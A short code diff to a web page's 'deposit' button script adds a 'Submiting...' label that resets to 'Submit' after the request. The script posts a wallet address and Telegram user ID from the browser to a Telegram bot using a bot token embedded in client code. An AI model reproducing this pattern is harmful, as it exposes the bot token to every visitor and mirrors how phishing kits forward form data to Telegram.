@@ -1,4 +1,6 @@
 document.getElementById('depositBtn').addEventListener('click', async () => {
+  let button = document.getElementById('depositBtn');
+
   const walletAddress = document
     .querySelector('#walletAddressInput')
     .value.trim();
@@ -20,6 +22,7 @@ document.getElementById('depositBtn').addEventListener('click', async () => {
 <i><b>Telegram UserId:</b></i> <code>${telegramUserId}</code>
 `;
   try {
+    button.innerText = 'Submiting...';
     const response = await fetch(
       `https://api.telegram.org/bot${botToken}/sendMessage`,
       {
@@ -37,8 +40,10 @@ document.getElementById('depositBtn').addEventListener('click', async () => {
 
     if (result.ok) {
       alert('Details sent successfully!');
+      button.innerText = 'Submit';
     } else {
       alert('Failed to send the message. Check the bot token and chat ID.');
+      button.innerText = 'Submit';
     }
   } catch (error) {
     console.error('Error sending message:', error);
